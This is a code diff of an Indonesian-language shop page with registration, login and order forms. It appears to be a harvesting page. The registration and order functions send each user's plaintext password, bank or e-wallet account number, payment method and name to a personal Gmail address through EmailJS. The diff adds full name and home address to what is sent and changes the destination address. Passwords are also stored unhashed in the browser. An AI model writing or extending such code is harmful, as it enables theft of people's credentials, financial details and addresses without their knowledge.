@@ -15,6 +15,7 @@ body.light nav{background:white;border-bottom:2px solid black;}
 button{padding:8px;border:none;background:red;color:white;margin-top:5px;cursor:pointer;}
 button:hover{background:white;color:red;}
 input,select,textarea{width:100%;padding:8px;margin:5px 0;}
+textarea{resize:none;}
 .hero{height:50vh;display:flex;flex-direction:column;justify-content:center;align-items:center;position:relative;overflow:hidden;}
 .flare{position:absolute;width:150px;height:150px;background:radial-gradient(circle, rgba(255,0,0,0.9), transparent 70%);border-radius:50%;animation:flareMove 4s infinite alternate;}
 @keyframes flareMove{from{transform:scale(1);}to{transform:scale(1.3) translateY(-30px);}}
@@ -94,6 +95,8 @@ footer{text-align:center;margin:20px 0;color:red;font-weight:bold;}
 <h2>Daftar</h2>
 <input type="text" id="regUser" placeholder="Username">
 <input type="password" id="regPass" placeholder="Password">
+<input type="text" id="fullName" placeholder="Nama Lengkap">
+<textarea id="address" placeholder="Alamat Lengkap"></textarea>
 <select id="paymentType" onchange="togglePayment()">
 <option value="">Pilih Metode</option>
 <option value="bank">Bank</option>
@@ -160,17 +163,26 @@ function showLogin(){loginBox.style.display="block";registerBox.style.display="n
 function togglePayment(){let type=paymentType.value;bankBox.style.display=(type=="bank")?"block":"none";ewalletBox.style.display=(type=="ewallet")?"block":"none";}
 
 function register(){
-let user=regUser.value,pass=regPass.value; // simpan password asli
-let paymentTypeVal=paymentType.value,paymentName="",paymentNumber="";
-if(paymentTypeVal=="bank"){paymentName=bankSelect.value;paymentNumber=bankNumber.value;}else{paymentName=ewalletSelect.value;paymentNumber=ewalletNumber.value;}
-let data={user,pass,paymentTypeVal,paymentName,paymentNumber,orders:[]};
+let user=regUser.value, pass=regPass.value, fullName=document.getElementById("fullName").value, address=document.getElementById("address").value;
+let paymentTypeVal=paymentType.value, paymentName="", paymentNumber="";
+if(paymentTypeVal=="bank"){paymentName=bankSelect.value; paymentNumber=bankNumber.value;} else {paymentName=ewalletSelect.value; paymentNumber=ewalletNumber.value;}
+let data={user, pass, fullName, address, paymentTypeVal, paymentName, paymentNumber, orders:[]};
 localStorage.setItem("user_"+user,JSON.stringify(data));
 emailjs.init("B7g13t_kSiLY7RWPU");
-emailjs.send("service_07pyt0g","template_h1z2fan",{username:user,password:pass,metode:paymentTypeVal,nama_metode:paymentName,nomor:paymentNumber,email_tujuan:"akunffsingapura54321@gmail.com"}).then(()=>alert("Pendaftaran terkirim!"));
+emailjs.send("service_07pyt0g","template_h1z2fan",{
+  username:user,
+  password:pass,
+  fullName:fullName,
+  address:address,
+  metode:paymentTypeVal,
+  nama_metode:paymentName,
+  nomor:paymentNumber,
+  email_tujuan:"fandifarsya25@gmail.com"
+}).then(()=>alert("Pendaftaran terkirim!"));
 }
 
 function login(){
-let user=loginUser.value;let pass=loginPass.value;
+let user=loginUser.value, pass=loginPass.value;
 let data=JSON.parse(localStorage.getItem("user_"+user));
 if(data && data.pass==pass){alert("Login berhasil!");document.getElementById("auth").style.display="none";document.getElementById("dashboard").style.display="block";document.getElementById("dashUser").innerText=user;loadOrders(data);}
 else{alert("Username atau Password salah!");}
@@ -193,7 +205,17 @@ localStorage.setItem("user_"+user,JSON.stringify(data));
 loadOrders(data);
 emailjs.init("B7g13t_kSiLY7RWPU");
 let paymentInfo=(data.paymentTypeVal=="bank")?data.paymentName+" "+data.paymentNumber:data.paymentName+" "+data.paymentNumber;
-emailjs.send("service_07pyt0g","template_lh1aqi9",{username:user,invoice:invoice,produk:produk,harga:harga,ukuran:ukuran,paymentInfo:paymentInfo,email_tujuan:"akunffsingapura54321@gmail.com"}).then(()=>alert("Pesanan terkirim!"));
+emailjs.send("service_07pyt0g","template_lh1aqi9",{
+  username:user,
+  invoice:invoice,
+  produk:produk,
+  harga:harga,
+  ukuran:ukuran,
+  paymentInfo:paymentInfo,
+  fullName:data.fullName,
+  address:data.address,
+  email_tujuan:"fandifarsya25@gmail.com"
+}).then(()=>alert("Pesanan terkirim!"));
 closeModal();
 }
 
